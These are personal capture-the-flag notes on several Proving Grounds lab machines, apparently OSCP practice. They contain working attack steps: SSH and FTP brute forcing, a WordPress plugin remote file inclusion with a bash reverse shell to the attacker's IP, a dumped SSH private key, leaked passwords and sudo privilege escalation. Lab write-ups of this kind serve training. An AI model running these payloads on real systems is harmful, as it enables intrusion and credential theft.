
## So Simple 
1. Nmap Scanning #nmap
```
???(kali?kali)-[~]
??$ sudo nmap -A -T4 192.168.52.78
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 19:37 EDT
Nmap scan report for 192.168.52.78
Host is up (0.00067s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b5543efafd03d0e63207af4ac416a45 (RSA)
|   256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA)
|_  256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: So Simple
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=8/19%OT=22%CT=1%CU=41791%PV=Y%DS=2%DC=T%G=Y%TM=64E1525
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M
OS:5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%
OS:O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
OS:DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT     ADDRESS
1   0.67 ms pg-bafw53.offseclabs.com (192.168.50.254)
2   0.87 ms 192.168.52.78

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds

```

2. Found Login page, tried to brute force , unsuccessful. #hydra

```
???(kali?kali)-[~]
??$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.52.78 ssh -t 4
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-19 21:00:03
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://192.168.52.78:22/
[STATUS] 36.00 tries/min, 36 tries in 00:01h, 14344363 to do in 6640:55h, 4 active
[STATUS] 28.00 tries/min, 84 tries in 00:03h, 14344315 to do in 8538:17h, 4 active
[STATUS] 26.86 tries/min, 188 tries in 00:07h, 14344211 to do in 8901:33h, 4 active

```

3. WPS scan done and found a vulnerability on webpage. #wpscan
```
(kali?kali)-[~]
$ sudo wpscan --url 'http://192.168.52.78/wordpress'

```
Website is vulnerable with social warfare plugins WordPress vulnerability. #CVE-2019-9978
Following link can display host machine details: 
```py
wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s
```

4. Host the http server. #httpserver
```
???(kali?kali)-[~]
??$ python3 -m http.server 8000
```

5. Tried to connect reverse shell

```
payload.txt = <pre>system('cat /etc/passwd')</pre>
link = http://192.168.52.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.52:8000/payload.txt

Display: 
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin max:x:1000:1000:roel:/home/max:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false steven:x:1001:1001:Steven,,,:/home/steven:/bin/bash
No changes made.

```

```
Reverse shell payload
1.txt = <pre>system("bash -c 'bash -i >& /dev/tcp/192.168.49.52/3333 0>&1'")</pre>
link = http://192.168.52.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.52:8000/1.txt

???(kali?kali)-[~]
??$ sudo nc -lvnp 3333
listening on [any] 3333 ...
connect to [192.168.49.52] from (UNKNOWN) [192.168.52.78] 41264
bash: cannot set terminal process group (922): Inappropriate ioctl for device
bash: no job control in this shell
www-data@so-simple:/var/www/html/wordpress/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

6. Obtained reverse shell, looking for further information, found user 'max' private keys. 
```
www-data@so-simple:/$ find / -name id_rsa 2> /dev/null
find / -name id_rsa 2> /dev/null
/home/max/.ssh/id_rsa
/home/max/this/is/maybe/the/way/to/a/private_key/id_rsa
www-data@so-simple:/$ cat /home/max/.ssh/id_rsa
cat /home/max/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

7. Save it in local machine and made it readable, writable to the owner. Get access to max account. #id_rsa
```
???(kali?kali)-[~]
??$ sudo nano id_rsa

???(kali?kali)-[~]
??$ sudo chmod 600 id_rsa 
  
???(kali?kali)-[~]
??$ sudo ssh -i id_rsa max@192.168.52.78

```

8. Used GTFO bins to login as steven from max account. #sudo_service
```
max@so-simple:~$ sudo -l
Matching Defaults entries for max on so-simple:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service
max@so-simple:~$ sudo -u steven /usr/sbin/service ../../bin/sh
$ id
uid=1001(steven) gid=1001(steven) groups=1001(steven)

```

9. Again used GTFO bins to swtich to root from steven account. 

```
$ sudo -l
Matching Defaults entries for steven on so-simple:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh
$ mkdir /opt/tools/server-health.sh
mkdir: cannot create directory ?/opt/tools/server-health.sh?: No such file or directory
$ mkdir /opt/tools/
$ touch /opt/tools/server-health.sh
$ cat /opt/tools/server-health.sh
$ nano /opt/tools/server-health.sh
$ chmod 777 /opt/tools/server-health.sh
$ sudo -u root /opt/tools/server-health.sh
root@so-simple:/# id
uid=0(root) gid=0(root) groups=0(root)
root@so-simple:/# ls
bin    dev   lib    libx32      mnt   root  snap      sys  var
boot   etc   lib32  lost+found  opt   run   srv       tmp
cdrom  home  lib64  media       proc  sbin  swap.img  usr
root@so-simple:/# cd /root
root@so-simple:~# ls
flag.txt  proof.txt  snap
root@so-simple:~# cat flag.txt
This is not the flag you're looking for...

```

10. Rooted. 


## Stapler 

- Nmap scan for the victim machine. #nmap 
```
6\^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.11 - 4.1
Network Distance: 2 hops
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -20m00s, deviation: 34m38s, median: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-08-21T13:37:19
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2023-08-21T14:37:19+01:00

TRACEROUTE (using port 20/tcp)
HOP RTT     ADDRESS
1   0.40 ms pg-bafw53.offseclabs.com (192.168.50.254)
2   0.71 ms 192.168.59.148

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.37 seconds

```

- Found ftp and ssh ports open, tried login with anonymous for ftp. Received a note with message. #ftpanonymous
```
???(kali?kali)-[~]
??$ ftp anonymous@192.168.59.148  
Connected to 192.168.59.148.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> id
550 Permission denied.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jun 04  2016 .
drwxr-xr-x    2 0        0            4096 Jun 04  2016 ..
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> cat note
?Invalid command.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
100% |*******************************************************************************|   107       52.93 KiB/s    00:00 ETA
226 Transfer complete.
107 bytes received in 00:00 (46.62 KiB/s)
ftp> cd/home
?Invalid command.
ftp> cd /home
550 Failed to change directory.
ftp> exit
221 Goodbye.

???(kali?kali)-[~]
??$ cat note 
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.

```

- Tried ftp and ssh hydra bruteforce on user John and Elly, Failed to crack any password. #hydraftp #hydrassh
```
hydra -l Elly -P /usr/share/wordlists/rockyou.txt ftp://192.168.59.148 -V
hydra -l Elly -P /usr/share/wordlists/rockyou.txt ssh://192.168.59.148 
hydra -l John -P /usr/share/wordlists/rockyou.txt ftp://192.168.59.148 -V
hydra -l John -P /usr/share/wordlists/rockyou.txt ssh://192.168.59.148 

```

- Perform enum4linux enumeration and found a user names. #enum4linux
```
???(kali?kali)-[~]
??$ enum4linux -a 192.168.59.148


[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                       
S-1-22-1-1000 Unix User\peter (Local User)                                                                                  
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

```

- Save username only on the text file.  #cut
```
cat users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > user_list.txt

```

- Crack a ftp credentials using new file. 
```
???(kali?kali)-[~]
??$ hydra -L user_list.txt -P user_list.txt 192.168.59.148 ftp 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-21 10:09:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 961 login tries (l:31/p:31), ~61 tries per task
[DATA] attacking ftp://192.168.59.148:21/
[21][ftp] host: 192.168.59.148   login: SHayslett   password: SHayslett
^Z
zsh: suspended  hydra -L user_list.txt -P user_list.txt 192.168.59.148 ftp

```

- Establish ssh connection with ftp user and read out .bash_history file which was permitted to root users only. #bashhistoryroot
```
???(kali?kali)-[~]
??$ ssh SHayslett@192.168.59.148
The authenticity of host '192.168.59.148 (192.168.59.148)' can't be established.
ED25519 key fingerprint is SHA256:eKqLSFHjJECXJ3AvqDaqSI9kP+EbRmhDaNZGyOrlZ2A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.59.148' (ED25519) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.59.148's password: 
Welcome back!



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SHayslett@red:~$ id
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)

SHayslett@red:/home$ find -name ".bash_history" -exec cat {} \;
exit
free
exit
cat: ./peter/.bash_history: Permission denied
find: ?./peter/.cache?: Permission denied
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 ssh peter@localhost
ps -ef
top
kill -9 3747
exit
exit
exit
exit
whoami
find: ?./zoe/.ssh?: Permission denied

```

- Ssh connect to the user peter. Find out all sudo permission is permitted. 
```
SHayslett@red:/home$ ssh peter@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@localhost's password: 
Welcome back!


red% ls
red% id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)

red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
```

- Perform pri. esc. #sudo_all
```
$ sudo '/bin/bash'
root@red:~# id
uid=0(root) gid=0(root) groups=0(root)
root@red:~# ls
root@red:~# cd /root
root@red:/root# ls
fix-wordpress.sh  flag.txt  issue  proof.txt  wordpress.sql
root@red:/root# cat proof.txt
33345d78503a4b56d5b27f827de8bbb3
root@red:/root# 

```

- Rooted. 


## eLection1 
1. Rustscan and Nmap
```
rustscan 192.168.176.211

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack


nmap -p$(cat election1-open-ports.txt | cut -f1 -d '/' | tr '\n' ', -A 192.168.176.211
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 04:15 EST
Nmap scan report for 192.168.176.211
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; pro2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at httmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.75 seconds

```

2. Directory search
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.176.211/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/OSCP/pg/reports/http_192.168.176.211/__24-02-23_04-16-21.txt

Target: http://192.168.176.211/

[04:16:21] Starting: 
[04:16:36] 403 -  280B  - /.ht_wsr.txt                                      
[04:16:36] 403 -  280B  - /.htaccess.bak1                                   
[04:16:36] 403 -  280B  - /.htaccess.save                                   
[04:16:36] 403 -  280B  - /.htaccess.orig                                   
[04:16:36] 403 -  280B  - /.htaccess_extra
[04:16:36] 403 -  280B  - /.htaccess_orig                                   
[04:16:36] 403 -  280B  - /.htaccessBAK
[04:16:36] 403 -  280B  - /.htaccess_sc
[04:16:36] 403 -  280B  - /.htaccess.sample
[04:16:36] 403 -  280B  - /.htaccessOLD
[04:16:36] 403 -  280B  - /.htaccessOLD2
[04:16:36] 403 -  280B  - /.htm                                             
[04:16:36] 403 -  280B  - /.html
[04:16:36] 403 -  280B  - /.htpasswd_test                                   
[04:16:36] 403 -  280B  - /.htpasswds
[04:16:36] 403 -  280B  - /.httr-oauth
[04:16:40] 403 -  280B  - /.php                                             
[04:18:07] 301 -  323B  - /javascript  ->  http://192.168.176.211/javascript/
[#############       ] 69%   8021/11460        74/s       job:1/1  errors:[04:18:28] 200 -   24KB - /phpinfo.php
[04:18:28] 301 -  323B  - /phpmyadmin  ->  http://192.168.176.211/phpmyadmin/
[04:18:31] 200 -    3KB - /phpmyadmin/doc/html/index.html
[04:18:31] 200 -    3KB - /phpmyadmin/index.php
[04:18:31] 200 -    3KB - /phpmyadmin/
[04:18:39] 200 -   30B  - /robots.txt
[04:18:42] 403 -  280B  - /server-status/                                   
[04:18:42] 403 -  280B  - /server-status
                                                                       
Task Completed 
```

3. Check out robots.txt
```
admin
wordpress
user
election
```

4. Find out subdirectory /election. Dirsearch for subdirectory.  Found credentials in one of them. 
```
feroxbuster -u http://192.168.176.211/election/

http://192.168.176.211/election/admin/logs/

[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
```

5. Ssh login and found local.txt
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ ssh love@192.168.176.211  

love@election:~$ cat local.txt
9ce27d7cddbab96be1c191a6ee45bd74
```

7. Manual enumeration done, no important vector, run linpeas. Found pwnkit vulnerability. 
```
love@election:/tmp$ ./linpeas.sh 

[+] [CVE-2021-4034] PwnKit 
```

8. Run pwnkit and obtained proof.txt
```
love@election:/tmp$ ./PwnKit 
root@election:/tmp# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)

root@election:~# cat proof.txt 
c1d3e26e44f24c46ab8b7187119cb7bb
```

## Monitoring 
1. Rustscan and Nmap
```
rustscan 192.168.176.136

22/tcp   open  ssh     syn-ack
25/tcp   open  smtp    syn-ack
80/tcp   open  http    syn-ack
389/tcp  open  ldap    syn-ack
443/tcp  open  https   syn-ack
5667/tcp open  unknown syn-ack

nmap -p$(cat monitoring-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.176.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 05:48 EST
Nmap scan report for 192.168.176.136
Host is up (0.30s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
